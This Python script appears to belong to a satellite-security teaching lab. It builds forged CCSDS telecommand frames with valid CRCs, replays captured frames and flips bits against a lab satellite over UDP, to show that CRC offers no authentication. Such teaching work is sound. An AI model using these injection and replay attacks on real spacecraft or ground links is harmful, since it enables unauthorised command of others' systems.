"""
Attacker - phase 1. Now the link speaks CCSDS, but there is still no authentication.

Scenarios:
  inject          builds a valid TC frame (with its CRC) and sets the payload to red.
                  The SCID is not a secret: in real life it is public.
  replay <hex>    sends a frame captured from the link again, without changes. Copy
                  the hex from a "[AIR] TC sent" line of the ground console.
  corrupt <hex>   sends a frame with one bit changed: the CRC catches it. This shows
                  that the CRC protects against errors, but NOT against attackers.

Side effect of 'inject': the satellite thinks the attacker is the ground station
and sends the telemetry to it. Ground gets no HK until it sends a command again.

Usage (in PowerShell):
    py attacks\\attack_f1.py --sat 192.168.33.105 inject
    py attacks\\attack_f1.py --sat 192.168.33.105 replay 00c5001103...
    py attacks\\attack_f1.py --sat 192.168.33.105 corrupt 00c5001103...

Only against your own C5, on your own network.
"""

import argparse
import os
import random
import socket
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))

from ccsds import frames, services  # noqa: E402
from ccsds.frames import CcsdsError  # noqa: E402

TC_PORT = 10025


def send_and_listen(sat: tuple, frame: bytes, wait: float = 2.0) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(wait)
        s.sendto(frame, sat)
        print(f"[ATTACKER] Frame sent ({len(frame)} bytes): {frame.hex()}")
        try:
            data, _ = s.recvfrom(2048)
        except (socket.timeout, ConnectionResetError):
            print("[ATTACKER] No answer from the satellite.")
            return
    try:
        tm = frames.parse_tm_frame(data)
    except CcsdsError as e:
        print(f"[ATTACKER] Answer can not be read: {e}")
        return
    for pkt in tm.packets:
        print(f"[ATTACKER] Telemetry received: {services.decode_tm_packet(pkt)}")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Attacker (phase 1, only for your lab)")
    p.add_argument("--sat", required=True, help="IP of YOUR C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="scenario", required=True)
    sub.add_parser("inject", help="inject a fake but well formed telecommand")
    rp = sub.add_parser("replay", help="send a captured frame again")
    rp.add_argument("hex")
    cp = sub.add_parser("corrupt", help="send a frame with one bit changed")
    cp.add_argument("hex")
    args = p.parse_args(argv)
    sat = (args.sat, args.port)

    if args.scenario == "inject":
        pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), bytes([255, 0, 0]))
        frame = frames.build_tc_frame(pkt, seq=random.randint(0, 255))
        print("[ATTACKER] Building a valid CCSDS TC frame, with a correct CRC, without any secret.")
        send_and_listen(sat, frame)
    else:
        try:
            frame = bytes.fromhex(args.hex)
        except ValueError:
            print("[ATTACKER] That hex is not valid. Copy the full frame from the ground console.")
            return 1
        if args.scenario == "corrupt":
            frame = bytearray(frame)
            frame[len(frame) // 2] ^= 0x01
            frame = bytes(frame)
            print("[ATTACKER] I changed one bit of the frame.")
        else:
            print("[ATTACKER] Sending a captured frame again, without changes.")
        send_and_listen(sat, frame)
    return 0


if __name__ == "__main__":
    sys.exit(main())
